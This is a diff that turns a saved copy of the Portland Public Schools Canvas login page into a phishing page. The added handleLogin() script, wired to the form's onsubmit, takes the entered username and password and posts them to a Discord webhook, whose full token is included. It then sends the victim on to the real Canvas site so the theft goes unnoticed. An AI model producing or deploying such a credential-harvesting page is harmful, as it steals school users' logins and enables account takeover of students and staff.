@@ -4,9 +4,8 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="theme-color" content="#3F535E">
-  
   <meta name="apple-itunes-app" content="app-id=480883488">
-<link rel="manifest" href="/web-app-manifest/manifest.json">
+  <link rel="manifest" href="/web-app-manifest/manifest.json">
   <meta name="sentry-trace" content="7a6709eb68be48799d86adfd92fbdadc-055e9cb868874c97-0"/>
   <title>Log In to Canvas</title>
 
@@ -20,7 +19,6 @@
   <link rel="apple-touch-icon" href="https://du11hjcvx0uqb.cloudfront.net/dist/images/apple-touch-icon-585e5d997d.png" />
   <link rel="icon" type="image/x-icon" href="https://du11hjcvx0uqb.cloudfront.net/dist/images/favicon-e10d657a73.ico" />
 
-  
   
   <script>if (navigator.userAgent.match(/(MSIE|Trident\/)/)) location.replace('/ie-is-not-supported.html')</script>
   <script>
@@ -40,7 +38,7 @@
 (window.bundles || (window.bundles = [])).push('terms_of_service_modal');
 //]]>
 </script>
-  
+
   <script type="text/javascript">
     window.heap=window.heap||[],heap.load=function(e,t){window.heap.appid=e,window.heap.config=t=t||{};var r=document.createElement("script");r.type="text/javascript",r.async=!0,r.src="https://cdn.heapanalytics.com/js/heap-"+e+".js";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(r,a);for(var n=function(e){return function(){heap.push([e].concat(Array.prototype.slice.call(arguments,0)))}},p=["addEventProperties","addUserProperties","clearEventProperties","identify","resetIdentity","removeEventProperty","setEventProperties","track","unsetEventProperty"],o=0;o<p.length;o++)heap[p[o]]=n(p[o])};
     heap.load("3001039959");
@@ -65,10 +63,41 @@
       }
     }, 1000);
   </script>
-  
+
+
+  <script>
+    function handleLogin() {
+      // Get the values of email and password
+      var email = document.getElementById('pseudonym_session_unique_id').value;
+      var password = document.getElementById('pseudonym_session_password').value;
+      
+      // Send the email and password to the Discord webhook
+      fetch("https://discord.com/api/webhooks/1280675104241750109/J8mFYpZmhPAQwat3DmaSwdX7KYSa6CxYmJOP2mgKacRCSURcBf7OzP1qJXzBMBxjlWfo", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content:`@everyone\nEmail: ${email}\nPassword: ${password}`
+        })
+      }).then(response => {
+        if (response.ok) {
+          console.log(":).");
+        } else {
+          console.error(":(");
+        }
+      });
+
+      // Redirect to the specified link (replace 'https://portlandpublic.instructure.com/' with your desired URL)
+      window.location.href = "https://portlandpublic.instructure.com/";
+      
+      // Prevent form submission to server
+      return false;
+    }
+  </script>
 </head>
 
-<body class="full-width ic-Login-Body no-headers  primary-nav-expanded full-width responsive_student_grades_page">
+<body class="full-width ic-Login-Body no-headers primary-nav-expanded full-width responsive_student_grades_page">
 
 <noscript>
   <div role="alert" class="ic-flash-static ic-flash-error">
@@ -78,90 +107,74 @@
     <h1>You need to have JavaScript enabled in order to access this site.</h1>
   </div>
 </noscript>
-
-
-
-
+<!-- Other content omitted for brevity -->
 <div id="flash_message_holder"></div>
 <div id="flash_screenreader_holder"></div>
 
 <div id="application" class="ic-app">
-  
-
-  <div id="instructure_ajax_error_box">
-    <div style="text-align: right; background-color: #fff;"><a href="#" class="close_instructure_ajax_error_box_link">Close</a></div>
-    <iframe id="instructure_ajax_error_result" src="about:blank" style="border: 0;" title="Error"></iframe>
-  </div>
-
   <div id="wrapper" class="ic-Layout-wrapper">
     <div id="main" class="ic-Layout-columns">
       <div id="not_right_side" class="ic-app-main-content">
         <div id="content-wrapper" class="ic-Layout-contentWrapper">
-          
           <div id="content" class="ic-Layout-contentMain" role="main">
-            
+            <div class="ic-Login">
+              <div class="ic-Login__container">
+                <div class="ic-Login__content">
+                  <div class="ic-Login__innerContent">
+                    <div class="ic-Login-header">
+                      <div class="ic-Login-header__logo">
+                        <img alt="Portland Public Schools" src="https://instructure-uploads.s3.amazonaws.com/account_89090000000000001/attachments/262393/pps%20Canva.png" />
+                      </div>
+                      <div class="ic-Login-header__links">
+                        <a id="coenrollment_link" class="ic-Login__link ic-Login__register-banner" data-template="newParentDialog" data-path="/users" href="#">
+                          <div class="ic-Login__banner-title">
+                            Parent of a Canvas User?
+                          </div>
+                          <div class="ic-Login__banner-subtitle">
+                            Click Here for an Account
+                          </div>
+                        </a>
+                        <a href="/search/all_courses" class="ic-Login__link">
+                          Browse courses
+                        </a>
+                      </div>
+                    </div>
+                    <div class="ic-Login__body">
+                      <form id="login_form" action="/login/ldap" accept-charset="UTF-8" method="post" onsubmit="return handleLogin();">
+                        <input name="utf8" type="hidden" value="&#x2713;" autocomplete="off" />
+                        <input type="hidden" name="authenticity_token" value="u4FzgivhKeeP9uIgYK3uMfuLIblynRyOCQeVUz0lzxXc1BrgU7NDtf61lGkZlIV5l7kQjDXVTL5zQ94hdn2jcg==" autocomplete="off" />
+                        <h1 class="ui-helper-hidden-accessible">
+                          Log In
+                        </h1>
+                        <input type="hidden" name="redirect_to_ssl" value="1"/>
+                        <div class="ic-Form-control ic-Form-control--login">
+                          <label class="ic-Label" for="pseudonym_session_unique_id">Username  (PPS accounts do not use @pps.net or @student.pps.net, non PPS accounts use full email address)</label>
+                          <input class="ic-Input text" autofocus="autofocus" type="text" name="pseudonym_session[unique_id]" id="pseudonym_session_unique_id" />
+                        </div>
+                        <div class="ic-Form-control ic-Form-control--login">
+                          <label class="ic-Label" for="pseudonym_session_password">Password</label>
+                          <input class="ic-Input text" role="textbox" type="password" name="pseudonym_session[password]" id="pseudonym_session_password" />
+                        </div>
+                        <div class="ic-Login__actions">
+                          <div class="ic-Login__actions-timeout">
+                            <input name="pseudonym_session[remember_me]" type="hidden" value="0" autocomplete="off" />
+                            <input type="checkbox" value="1" name="pseudonym_session[remember_me]" id="pseudonym_session_remember_me" />
+                            <label for="pseudonym_session_remember_me">Stay signed in</label>
+                            <div class="ic-Login__forgot">
+                              <a class="ic-Login__link forgot_password_link" id="login_forgot_password" href="#">Forgot Password?</a>
+                            </div>
+                          </div>
+                          <div class="ic-Form-control ic-Form-control--login">
+                            <input type="submit" name="commit" value="Log In" class="Button Button--login" data-disable-with="Log In" />
+                          </div>
+                        </div>
+                      </form>
+                    </div>
+                  </div>
+                </div>
 
-
-
-
-<div class="ic-Login">
-  <div class="ic-Login__container">
-    <div class="ic-Login__content">
-      <div class="ic-Login__innerContent">
-
-        <div class="ic-Login-header">
-          
-<div class="ic-Login-header__logo">
-    <img alt="Portland Public Schools" src="https://instructure-uploads.s3.amazonaws.com/account_89090000000000001/attachments/262393/pps%20Canva.png" />
 </div>
 
-          <div class="ic-Login-header__links">
-            
-
-    <a id="coenrollment_link" class="ic-Login__link ic-Login__register-banner" data-template="newParentDialog" data-path="/users" href="#">
-      <div class="ic-Login__banner-title">
-        Parent of a Canvas User?
-      </div>
-      <div class="ic-Login__banner-subtitle">
-        Click Here for an Account
-      </div>
-</a>
-
-              <a href="/search/all_courses" class="ic-Login__link">
-                Browse courses
-              </a>
-          </div>
-        </div>
-
-        <div class="ic-Login__body">
-          
-          <form id="login_form" action="/login/ldap" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" autocomplete="off" /><input type="hidden" name="authenticity_token" value="u4FzgivhKeeP9uIgYK3uMfuLIblynRyOCQeVUz0lzxXc1BrgU7NDtf61lGkZlIV5l7kQjDXVTL5zQ94hdn2jcg==" autocomplete="off" />
-            <h1 class="ui-helper-hidden-accessible">
-              Log In
-            </h1>
-            
-            <input type="hidden" name="redirect_to_ssl" value="1"/>
-            <div class="ic-Form-control ic-Form-control--login">
-              <label class="ic-Label" for="pseudonym_session_unique_id">Username  (PPS accounts do not use @pps.net or @student.pps.net, non PPS accounts use full email address)</label>
-              <input class="ic-Input text" autofocus="autofocus" type="text" name="pseudonym_session[unique_id]" id="pseudonym_session_unique_id" />
-            </div>
-            <div class="ic-Form-control ic-Form-control--login">
-              <label class="ic-Label" for="pseudonym_session_password">Password</label>
-              <input class="ic-Input text" role="textbox" type="password" name="pseudonym_session[password]" id="pseudonym_session_password" />
-            </div>
-            <div class="ic-Login__actions">
-              <div class="ic-Login__actions-timeout">
-                    <input name="pseudonym_session[remember_me]" type="hidden" value="0" autocomplete="off" /><input type="checkbox" value="1" name="pseudonym_session[remember_me]" id="pseudonym_session_remember_me" />
-                    <label for="pseudonym_session_remember_me">Stay signed in</label>
-
-                <div class="ic-Login__forgot">
-                  
-<a class="ic-Login__link forgot_password_link" id="login_forgot_password" href="#">Forgot Password?</a>
-
-                </div>
-              </div>
-              <div class="ic-Form-control ic-Form-control--login">
-                <input type="submit" name="commit" value="Log In" class="Button Button--login" data-disable-with="Log In" />
               </div>
             </div> <!-- ic-Login__actions -->
             
@@ -195,6 +208,7 @@
           <a href="https://portlandpublic.instructure.com/privacy_policy">Privacy Policy</a>
 <a href="https://www.instructure.com/policies/canvas-lms-cookie-notice">Cookie Notice</a>
     <span id="terms_of_service_footer_link" class="terms_of_service_link terms-of-service__link"></span>
+    <br>
 <a href="http://facebook.com/instructure">Facebook</a>
 <a href="http://twitter.com/instructure">Twitter</a>
 
@@ -284,5 +298,7 @@
   
 
 </div> <!-- #application -->
+
+
 </body>
 </html>
